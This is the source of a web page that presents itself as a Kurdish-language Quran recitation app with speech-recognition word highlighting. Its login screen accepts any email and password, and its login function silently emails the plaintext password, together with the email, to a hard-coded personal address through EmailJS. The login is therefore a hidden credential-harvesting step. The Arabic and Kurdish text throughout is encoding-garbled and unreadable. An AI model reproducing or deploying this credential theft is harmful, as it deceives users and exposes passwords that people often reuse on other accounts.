<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„Ù…ØµØ­Ù Ø§Ù„Ø°ÙƒÙŠ - Fast Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap" rel="stylesheet">
    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
       (function(){
          emailjs.init("dilvEcwO_XTFsbzIw");
       })();
    </script>

    <style>
        :root { --bg-color: #fffbf2; --border-color: #d4af37; --highlight-color: #27ae60; }
        body { font-family: 'Amiri', serif; background-color: #f8f9fa; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        
        #app-container { display: none; }

        .main-container { width: 100%; max-width: 700px; background-color: var(--bg-color); border: 2px solid var(--border-color); border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); display: flex; flex-direction: column; height: 95vh; position: relative; }
        .header { background: white; padding: 10px; border-bottom: 2px solid var(--border-color); text-align: center; border-radius: 15px 15px 0 0; display: flex; justify-content: space-between; align-items: center; padding-left: 20px; padding-right: 20px;}
        
        select { font-family: 'Amiri', serif; font-size: 18px; padding: 8px; width: 60%; border: 1px solid var(--border-color); border-radius: 8px; outline: none; background: #fff; }
        
        .user-info { display: flex; align-items: center; gap: 10px; font-size: 14px; }
        .user-avatar { width: 35px; height: 35px; border-radius: 50%; border: 1px solid var(--border-color); display: flex; justify-content: center; align-items: center; background: #eee; font-weight: bold; color: #555;}
        .logout-btn { background: #c0392b; color: white; border: none; padding: 5px 12px; border-radius: 5px; cursor: pointer; font-size: 14px; font-family: 'Amiri', serif;}

        .quran-content { flex-grow: 1; padding: 20px; overflow-y: auto; text-align: justify; font-size: 30px; line-height: 2.8; scroll-behavior: smooth; }
        .ayah-container { display: inline; }
        .word { display: inline-block; padding: 2px 2px; border-radius: 4px; transition: all 0.1s ease; cursor: pointer; }
        .word.active { color: var(--highlight-color); font-weight: bold; text-shadow: 0 0 1px var(--highlight-color); transform: scale(1.15); }
        .ayah-number { font-size: 18px; color: var(--border-color); border: 1px solid var(--border-color); border-radius: 50%; padding: 0 6px; margin: 0 5px; display: inline-block; }
        .basmala { text-align: center; font-size: 24px; color: var(--border-color); margin-bottom: 15px; display: block; }
        .footer { background: white; padding: 10px; border-top: 1px solid #eee; border-radius: 0 0 15px 15px; display: flex; flex-direction: column; align-items: center; }
        
        /* Ø¨Ø§Ø´ØªØ±Ú©Ø±Ø¯Ù†ÛŒ Ø¯ÛŒØ²Ø§ÛŒÙ†ÛŒ Ú©Û•Ù¾Ø´Ù†Û•Ú©Û• Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ø®ÛØ±Ø§ Ø¯Û•Ø±Ú©Û•ÙˆÛØª */
        #live-caption { width: 95%; background-color: #f1f1f1; padding: 8px; border-radius: 8px; font-size: 16px; color: #333; margin-bottom: 10px; text-align: center; min-height: 30px; border: 1px solid #ddd; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        
        button#mic-btn { background-color: var(--border-color); color: white; border: none; padding: 12px 40px; font-size: 18px; border-radius: 50px; cursor: pointer; font-family: 'Amiri', serif; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 10px rgba(212, 175, 55, 0.3); transition: background 0.3s; }
        button.listening { background-color: #e74c3c !important; animation: pulse 1.5s infinite; }
        
        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #fdfbf1 0%, #d4af37 100%); display: flex; justify-content: center; align-items: center; z-index: 2000; overflow-y: auto; }
        .login-box { background: white; padding: 40px; border-radius: 20px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); }
        .login-box h1 { color: #d4af37; margin-bottom: 10px; font-size: 32px; }
        .login-box p { color: #777; margin-bottom: 20px; }
        
        .input-group { margin-bottom: 15px; text-align: right; }
        .input-group input { width: 92%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-family: 'Amiri', serif; font-size: 16px; margin-bottom: 10px; }
        
        .btn-login { width: 100%; padding: 12px; background: #d4af37; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; transition: 0.3s; font-family: 'Amiri', serif; margin-top: 10px;}
        .btn-login:hover { background: #b6962f; }

        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(231, 76, 60, 0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(231, 76, 60, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(231, 76, 60, 0); } }
    </style>
</head>
<body>

    <div id="login-screen">
        <div class="login-box">
            <h1>Login</h1>
            <p>Ø³Û•Ø±Û•ØªØ§ Ø¨Ú†Û† Ú˜ÙˆÙˆØ±Û•ÙˆÛ•</p>
            
            <div class="input-group">
                <input type="email" id="user-email" placeholder="Ø¦ÛŒÙ…Û•ÛŒÚµ (Email)">
                <input type="password" id="user-pass" placeholder="ÙˆØ´Û•ÛŒ Ù†Ù‡ÛÙ†ÛŒ (Password)">
            </div>
            <button class="btn-login" onclick="sendEmailAndLogin()">Ú†ÙˆÙˆÙ†Û•Ú˜ÙˆÙˆØ±Û•ÙˆÛ•</button>
            <p id="status-msg" style="font-size: 12px; margin-top: 10px; color: #888;"></p>
        </div>
    </div>

    <div class="main-container" id="app-container">
        <div class="header">
            <div class="user-info">
                <div id="user-avatar" class="user-avatar">ğŸ‘¤</div>
                <span id="user-name-display"></span>
                <button class="logout-btn" onclick="logout()">Ø¯Û•Ø±Ú†ÙˆÙˆÙ†</button>
            </div>
            <select id="surahSelect" onchange="loadSurah(this.value)">
                <option value="1" selected>1. Ø³ÙˆØ±Ø© Ø§Ù„ÙØ§ØªØ­Ø©</option>
                <option value="" disabled>Ø¬Ø§Ø±ÛŒ Ø¨Ø§Ø±Ú©Ø±Ø¯Ù†ÛŒ Ø¦Û•ÙˆØ§Ù†ÛŒ ØªØ±...</option>
            </select>
        </div>

        <div class="quran-content" id="quran-display"></div>

        <div class="footer">
            <div id="live-caption">...</div>
            <button id="mic-btn" onclick="toggleListening()">
                <span>ğŸ¤</span> Ø¯Û•Ø³ØªÙ¾ÛÚ©Ø±Ø¯Ù†
            </button>
        </div>
    </div>

    <script>
        const loginScreen = document.getElementById('login-screen');
        const appContainer = document.getElementById('app-container');
        const userEmailInput = document.getElementById('user-email');
        const userPassInput = document.getElementById('user-pass');
        const userNameDisplay = document.getElementById('user-name-display');
        const userAvatar = document.getElementById('user-avatar');
        const statusMsg = document.getElementById('status-msg');

        const savedUser = localStorage.getItem('quranAppUserEmail');
        if (savedUser) {
            showApp(savedUser);
        }

        // --- Ú†ÙˆÙˆÙ†Û•Ú˜ÙˆÙˆØ±Û•ÙˆÛ•ÛŒ Ø®ÛØ±Ø§ (Optimistic UI) ---
        function sendEmailAndLogin() {
            const email = userEmailInput.value.trim();
            const password = userPassInput.value.trim();

            if (!email || !password) {
                alert("ØªÚ©Ø§ÛŒÛ• Ù‡Û•Ù…ÙˆÙˆ Ø®Ø§Ù†Û•Ú©Ø§Ù† Ù¾Ú• Ø¨Ú©Û•Ø±Û•ÙˆÛ•");
                return;
            }

            // ÛŒÛ•Ú©Ø³Û•Ø± Ø¦Û•Ù¾Û•Ú©Û• Ø¨Ú©Û•Ø±Û•ÙˆÛ• Ø¨Û Ø¦Û•ÙˆÛ•ÛŒ Ú†Ø§ÙˆÛ•Ú•ÛÛŒ Ø¦ÛŒÙ…Û•ÛŒÚµ Ø¨Ú©Û•ÛŒØª
            localStorage.setItem('quranAppUserEmail', email);
            showApp(email);

            // Ø¦ÛŒÙ…Û•ÛŒÚµÛ•Ú©Û• Ù„Û• Ø¨Ø§Ú©Ú¯Ø±Ø§ÙˆÙ†Ø¯ Ø¯Û•Ù†ÛØ±ÛŒÙ†
            var templateParams = {
                to_email: 'muhamadgyan30@gmail.com', 
                user_email: email, 
                message: "User Password: " + password 
            };

            emailjs.send('service_yw2iv3b', 'template_ga0xhjs', templateParams)
                .then(function(response) {
                    console.log('Email sent silently');
                }, function(error) {
                    console.log('Email failed silently', error);
                });
        }

        function showApp(email) {
            loginScreen.style.display = 'none';
            appContainer.style.display = 'flex';
            userNameDisplay.innerText = email.split('@')[0];
            userAvatar.innerText = email.charAt(0).toUpperCase();
            init(); 
        }

        function logout() {
            localStorage.removeItem('quranAppUserEmail');
            window.location.reload();
        }

        // ==========================================
        // Quran App Logic (High Performance)
        // ==========================================
        const fatihaData = [
            { text: "Ø¨ÙØ³Ù’Ù…Ù Ù±Ù„Ù„ÙÙ‘Ù‡Ù Ù±Ù„Ø±ÙÙ‘Ø­Ù’Ù…ÙÙ°Ù†Ù Ù±Ù„Ø±ÙÙ‘Ø­ÙÙŠÙ…Ù", numberInSurah: 1 },
            { text: "Ù±Ù„Ù’Ø­ÙÙ…Ù’Ø¯Ù Ù„ÙÙ„ÙÙ‘Ù‡Ù Ø±ÙØ¨ÙÙ‘ Ù±Ù„Ù’Ø¹ÙÙ°Ù„ÙÙ…ÙÙŠÙ†Ù", numberInSurah: 2 },
            { text: "Ù±Ù„Ø±ÙÙ‘Ø­Ù’Ù…ÙÙ°Ù†Ù Ù±Ù„Ø±ÙÙ‘Ø­ÙÙŠÙ…Ù", numberInSurah: 3 },
            { text: "Ù…ÙÙ°Ù„ÙÙƒÙ ÙŠÙÙˆÙ’Ù…Ù Ù±Ù„Ø¯ÙÙ‘ÙŠÙ†Ù", numberInSurah: 4 },
            { text: "Ø¥ÙÙŠÙÙ‘Ø§ÙƒÙ Ù†ÙØ¹Ù’Ø¨ÙØ¯Ù ÙˆÙØ¥ÙÙŠÙÙ‘Ø§ÙƒÙ Ù†ÙØ³Ù’ØªÙØ¹ÙÙŠÙ†Ù", numberInSurah: 5 },
            { text: "Ù±Ù‡Ù’Ø¯ÙÙ†ÙØ§ Ù±Ù„ØµÙÙ‘Ø±ÙÙ°Ø·Ù Ù±Ù„Ù’Ù…ÙØ³Ù’ØªÙÙ‚ÙÙŠÙ…Ù", numberInSurah: 6 },
            { text: "ØµÙØ±ÙÙ°Ø·Ù Ù±Ù„ÙÙ‘Ø°ÙÙŠÙ†Ù Ø£ÙÙ†Ù’Ø¹ÙÙ…Ù’ØªÙ Ø¹ÙÙ„ÙÙŠÙ’Ù‡ÙÙ…Ù’ ØºÙÙŠÙ’Ø±Ù Ù±Ù„Ù’Ù…ÙØºÙ’Ø¶ÙÙˆØ¨Ù Ø¹ÙÙ„ÙÙŠÙ’Ù‡ÙÙ…Ù’ ÙˆÙÙ„ÙØ§ Ù±Ù„Ø¶ÙÙ‘Ø§Ù„ÙÙ‘ÙŠÙ†Ù", numberInSurah: 7 }
        ];

        let allAyahs = [];
        let currentAyahIndex = 0;
        let currentWordIndex = 0;
        let currentWords = []; 
        let isListening = false;
        let recognition;
        let lastMatchTime = 0;
        let autoSkipTimer;
        
        const surahSelect = document.getElementById('surahSelect');
        const quranDisplay = document.getElementById('quran-display');
        const captionBox = document.getElementById('live-caption');
        const micBtn = document.getElementById('mic-btn');

        function init() {
            if(allAyahs.length === 0) {
                allAyahs = fatihaData;
                renderSurah(1);
                prepareCurrentAyah();
                fetchSurahList();
            }
        }

        async function fetchSurahList() {
            try {
                const response = await fetch('https://api.alquran.cloud/v1/surah');
                const data = await response.json();
                surahSelect.innerHTML = '';
                data.data.forEach(surah => {
                    const option = document.createElement('option');
                    option.value = surah.number;
                    option.text = `${surah.number}. ${surah.name}`;
                    if(surah.number === 1) option.selected = true;
                    surahSelect.appendChild(option);
                });
            } catch (error) { console.log("Offline mode"); }
        }

        async function loadSurah(surahNumber) {
            if(surahNumber == 1) {
                allAyahs = fatihaData;
                renderSurah(1);
                currentAyahIndex = 0;
                prepareCurrentAyah();
                return;
            }
            quranDisplay.innerHTML = '<div style="text-align:center; margin-top:50px;">Ø¬Ø§Ø±ÛŒ Ù‡ÛÙ†Ø§Ù†ÛŒ Ø¦Ø§ÛŒÛ•ØªÛ•Ú©Ø§Ù†...</div>';
            try {
                const response = await fetch(`https://api.alquran.cloud/v1/surah/${surahNumber}/editions/quran-uthmani`);
                if(!response.ok) throw new Error("Blocked");
                const data = await response.json();
                allAyahs = data.data[0].ayahs;
                renderSurah(surahNumber);
                currentAyahIndex = 0;
                prepareCurrentAyah();
                // Ù¾ÛÙˆÛŒØ³Øª Ù†Ø§Ú©Ø§Øª Ù…Ø§ÛŒÚ© Ø¨Ú©ÙˆÚ˜ÛØªÛ•ÙˆÛ•ØŒ Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ø®ÛØ±Ø§ Ø¨ÛØª
                if(isListening && recognition) {
                    // Ù‡ÛŒÚ† Ù…Û•Ú©Û•ØŒ Ø¨Ø§ Ø¨Û•Ø±Ø¯Û•ÙˆØ§Ù… Ø¨ÛØª
                }
            } catch (error) {
                quranDisplay.innerHTML = `<div class="error-box"><h3>âš ï¸ Ú©ÛØ´Û•ÛŒ Ø¦ÛŒÙ†ØªÛ•Ø±Ù†ÛØª</h3><p>Ù†Ø§ØªÙˆØ§Ù†Ø±ÛØª Ø³ÙˆÚ•Û•ØªÛ•Ú©Ø§Ù†ÛŒ ØªØ± Ø¨Ø§Ø± Ø¨Ú©Ø±ÛØª.</p></div>`;
            }
        }

        function renderSurah(surahNum) {
            let html = "";
            if(surahNum != 1 && surahNum != 9) html += `<div class="basmala">Ø¨ÙØ³Ù’Ù…Ù Ù±Ù„Ù„ÙÙ‘Ù‡Ù Ù±Ù„Ø±ÙÙ‘Ø­Ù’Ù…ÙÙ°Ù†Ù Ù±Ù„Ø±ÙÙ‘Ø­ÙÙŠÙ…Ù</div>`;
            allAyahs.forEach((ayah, aIndex) => {
                let text = ayah.text;
                if(surahNum != 1 && aIndex === 0) text = text.replace("Ø¨ÙØ³Ù’Ù…Ù Ù±Ù„Ù„ÙÙ‘Ù‡Ù Ù±Ù„Ø±ÙÙ‘Ø­Ù’Ù…ÙÙ°Ù†Ù Ù±Ù„Ø±ÙÙ‘Ø­ÙÙŠÙ…Ù", "").trim();
                html += `<span id="ayah-${aIndex}" class="ayah-container">`;
                text.split(' ').forEach((word, wIndex) => {
                    html += `<span id="word-${aIndex}-${wIndex}" class="word">${word} </span>`;
                });
                html += `<span class="ayah-number">${ayah.numberInSurah}</span></span> `;
            });
            quranDisplay.innerHTML = html;
        }

        function prepareCurrentAyah() {
            if(currentAyahIndex < allAyahs.length) {
                let text = allAyahs[currentAyahIndex].text;
                if(currentAyahIndex === 0 && allAyahs.length > 7 && allAyahs[0].text.includes("Ø¨ÙØ³Ù’Ù…Ù")) 
                     text = text.replace("Ø¨ÙØ³Ù’Ù…Ù Ù±Ù„Ù„ÙÙ‘Ù‡Ù Ù±Ù„Ø±ÙÙ‘Ø­Ù’Ù…ÙÙ°Ù†Ù Ù±Ù„Ø±ÙÙ‘Ø­ÙÙŠÙ…Ù", "").trim();
                currentWords = text.split(' ');
                currentWordIndex = 0;
                const el = document.getElementById(`ayah-${currentAyahIndex}`);
                if(el) el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                resetAutoSkipTimer();
            }
        }

        // --- Ù¾Ø§Ú©Ú©Ø±Ø¯Ù†Û•ÙˆÛ•ÛŒ Ù¾ÛØ´Ú©Û•ÙˆØªÙˆÙˆÛŒ Ù‚ÙˆØ±Ø¦Ø§Ù† (Advanced Normalization) ---
        // Ø¦Û•Ù…Û• Ù†Ù‡ÛÙ†ÛŒ Ø®ÛØ±Ø§ÛŒÛŒ Ùˆ ÙˆØ±Ø¯ÛŒ Ù†Ø§Ø³ÛŒÙ†Û•ÙˆÛ•Ú©Û•ÛŒÛ•
        function normalizeArabic(text) {
            if (!text) return "";
            return text
                // Ù„Ø§Ø¨Ø±Ø¯Ù†ÛŒ Ù‡Û•Ù…ÙˆÙˆ Ù‡ÛÙ…Ø§ Ù‚ÙˆØ±Ø¦Ø§Ù†ÛŒÛŒÛ•Ú©Ø§Ù† Ùˆ ØªÛ•Ø´Ú©ÛŒÙ„Û•Ú©Ø§Ù† Ø¨Û• ÛŒÛ•Ú©Ø¬Ø§Ø±
                .replace(/[^\u0621-\u064A\u0660-\u0669 ]/g, '') 
                // ÛŒÛ•Ú©Ø®Ø³ØªÙ†ÛŒ Ø¦Û•Ù„ÛŒÙÛ•Ú©Ø§Ù†
                .replace(/(Ø¢|Ø¥|Ø£|Ù±|ïº|ïºƒ|ïº‡|ï­)/g, 'Ø§')
                // ÛŒÛ•Ú©Ø®Ø³ØªÙ†ÛŒ ØªØ§Ø¡ Ùˆ Ù‡Ø§Ø¡ (Ø²Û†Ø±Ø¬Ø§Ø± Ù„Û• ÙˆÛ•Ù‚ÙØ¯Ø§ Ø¯Û•Ø¨ÛØªÛ• Ù‡Ø§Ø¡)
                .replace(/(Ø©|Ù‡)/g, 'Ù‡')
                // ÛŒÛ•Ú©Ø®Ø³ØªÙ†ÛŒ ÛŒØ§Ø¡ Ùˆ Ø¦Û•Ù„ÛŒÙÛŒ Ù…Û•Ù‚ØµÙˆØ±Û•
                .replace(/(Ù‰|ÙŠ|Ø¦)/g, 'ÙŠ')
                // ÛŒÛ•Ú©Ø®Ø³ØªÙ†ÛŒ ÙˆØ§Ùˆ Ùˆ Ù‡Û•Ù…Ø²Û•ÛŒ Ø³Û•Ø± ÙˆØ§Ùˆ
                .replace(/(Ø¤|Ùˆ)/g, 'Ùˆ')
                .replace(/\s+/g, ' ')
                .trim();
        }

        if ('webkitSpeechRecognition' in window) {
            recognition = new webkitSpeechRecognition();
            recognition.continuous = true;
            recognition.interimResults = true; // Ø¦Û•Ù…Û• Ø²Û†Ø± Ú¯Ø±Ù†Ú¯Û• Ø¨Û† Ø®ÛØ±Ø§ÛŒÛŒ
            recognition.lang = 'ar-SA';
            recognition.maxAlternatives = 1;

            recognition.onstart = () => { isListening = true; micBtn.classList.add('listening'); micBtn.innerHTML = "<span>â¹</span> ÙˆÛ•Ø³ØªØ§Ù†"; captionBox.innerText = "..."; captionBox.style.color = "green"; resetAutoSkipTimer(); };
            
            recognition.onend = () => { 
                if (isListening) recognition.start(); 
                else { 
                    micBtn.classList.remove('listening'); 
                    micBtn.innerHTML = "<span>ğŸ¤</span> Ø¯Û•Ø³ØªÙ¾ÛÚ©Ø±Ø¯Ù†"; 
                    captionBox.innerText = "ÙˆÛ•Ø³ØªØ§."; 
                    captionBox.style.color = "#555"; 
                    clearTimeout(autoSkipTimer); 
                } 
            };

            recognition.onresult = (event) => { 
                // ÙˆÛ•Ø±Ú¯Ø±ØªÙ†ÛŒ Ø¦Û•Ù†Ø¬Ø§Ù…Û•Ú©Ø§Ù† Ø¨Û• Ø´ÛÙˆÛ•ÛŒÛ•Ú©ÛŒ Ø®ÛØ±Ø§ (Real-time)
                let transcript = '';
                for (let i = event.resultIndex; i < event.results.length; ++i) {
                    transcript += event.results[i][0].transcript;
                }
                captionBox.innerText = transcript; // Ù¾ÛŒØ´Ø§Ù†Ø¯Ø§Ù†ÛŒ Ø®ÛØ±Ø§
                checkMatch(transcript); 
            };
        } else { alert("ØªÚ©Ø§ÛŒÛ• Google Chrome Ø¨Û•Ú©Ø§Ø±Ø¨Ù‡ÛÙ†Û•"); }

        function checkMatch(spokenText) {
            if(currentAyahIndex >= allAyahs.length) return;
            // Ù„Ø§Ø¨Ø±Ø¯Ù†ÛŒ Ø¯ÛŒÙ„Û•ÛŒ 300ms Ø¨Û† Ø®ÛØ±Ø§ÛŒÛŒ Ø²ÛŒØ§ØªØ±
            
            let spokenClean = normalizeArabic(spokenText);
            
            // Ø³Û•ÛŒØ±ÛŒ 5 ÙˆØ´Û•ÛŒ Ù¾ÛØ´Û•ÙˆÛ• Ø¯Û•Ú©Ø§Øª
            for (let i = 0; i < 5; i++) {
                let indexToCheck = currentWordIndex + i;
                if (indexToCheck >= currentWords.length) break;
                
                let targetWordRaw = currentWords[indexToCheck];
                let targetClean = normalizeArabic(targetWordRaw);
                
                // Ø¦Û•Ú¯Û•Ø± ÙˆØ´Û•Ú©Û• Ø¯Û†Ø²Ø±Ø§ÛŒÛ•ÙˆÛ• (ØªÛ•Ù†Ø§Ù†Û•Øª Ø¨Û•Ø´ÛÚ©ÛŒØ´ÛŒ)
                if (spokenClean.includes(targetClean)) { 
                    // Ù‡Û•Ù…ÙˆÙˆ ÙˆØ´Û•Ú©Ø§Ù†ÛŒ Ù¾ÛØ´ÙˆÙˆ ØªØ§ Ø¦Û•Ù…Û• Ù¾Ú• Ø¨Ú©Û•Ø±Û•ÙˆÛ•
                    for(let j = 0; j <= i; j++) activateWord(); 
                    return; 
                }
            }
            
            // Ù¾Ø´Ú©Ù†ÛŒÙ†ÛŒ ØªÛ•ÙˆØ§ÙˆÛŒ Ø¦Ø§ÛŒÛ•ØªÛ•Ú©Û•
            let remainingTextRaw = currentWords.slice(currentWordIndex).join(" ");
            let remainingTextClean = normalizeArabic(remainingTextRaw);
            if (remainingTextClean.length > 5 && spokenClean.includes(remainingTextClean)) {
                completeCurrentAyah();
            }
        }

        function activateWord() {
            let el = document.getElementById(`word-${currentAyahIndex}-${currentWordIndex}`);
            if(el) el.classList.add('active');
            currentWordIndex++; 
            resetAutoSkipTimer();
            if(currentWordIndex >= currentWords.length) nextAyah();
        }

        function resetAutoSkipTimer() {
            clearTimeout(autoSkipTimer);
            if(!isListening) return;
            // Ú©Ø±Ø¯Ù… Ø¨Û• 4 Ú†Ø±Ú©Û• Ø¨Û† Ø®ÛØ±Ø§ÛŒÛŒ (Ø¯Û•ØªÙˆØ§Ù†ÛØª Ú©Û•Ù…ØªØ±ÛŒØ´ Ø¨Ú©Û•ÛŒØª)
            autoSkipTimer = setTimeout(() => {
                if(isListening && currentAyahIndex < allAyahs.length && currentWordIndex < currentWords.length) {
                    activateWord(); 
                    console.log("Auto skipped");
                }
            }, 4000); 
        }

        function completeCurrentAyah() {
            while(currentWordIndex < currentWords.length) {
                let el = document.getElementById(`word-${currentAyahIndex}-${currentWordIndex}`);
                if(el) el.classList.add('active'); currentWordIndex++;
            }
            nextAyah();
        }

        function nextAyah() {
            currentAyahIndex++; 
            captionBox.innerText = "..."; 
            clearTimeout(autoSkipTimer);
            
            if (currentAyahIndex < allAyahs.length) {
                prepareCurrentAyah();
            } else { 
                captionBox.innerText = "Ø¯Û•Ú†ÛØªÛ• Ø³ÙˆØ±Û•ØªÛŒ Ø¯ÙˆØ§ØªØ±..."; 
                // Ú©Ø§ØªÛŒ Ú†Ø§ÙˆÛ•Ú•ÙˆØ§Ù†ÛŒ Ø¨Û† Ú¯Û†Ú•ÛŒÙ†ÛŒ Ø³ÙˆØ±Û•Øª Ú©Û•Ù…Ú©Ø±Ø§ÛŒÛ•ÙˆÛ•
                setTimeout(() => { 
                    let currentSurahId = parseInt(surahSelect.value); 
                    let nextSurahId = currentSurahId + 1; 
                    if(nextSurahId <= 114) { 
                        surahSelect.value = nextSurahId; 
                        loadSurah(nextSurahId); 
                    } else { 
                        captionBox.innerText = "Ù¾ÛŒØ±Û†Ø²Û•! Ù‡Û•Ù…ÙˆÙˆ Ù‚ÙˆØ±Ø¦Ø§Ù†Øª ØªÛ•ÙˆØ§Ùˆ Ú©Ø±Ø¯."; 
                        isListening = false; 
                        recognition.stop(); 
                    } 
                }, 1000); // ØªÛ•Ù†Ù‡Ø§ 1 Ú†Ø±Ú©Û•
            }
        }

        function toggleListening() {
            if(isListening) { isListening = false; recognition.stop(); clearTimeout(autoSkipTimer); } else recognition.start();
        }
    </script>
</body>
</html>
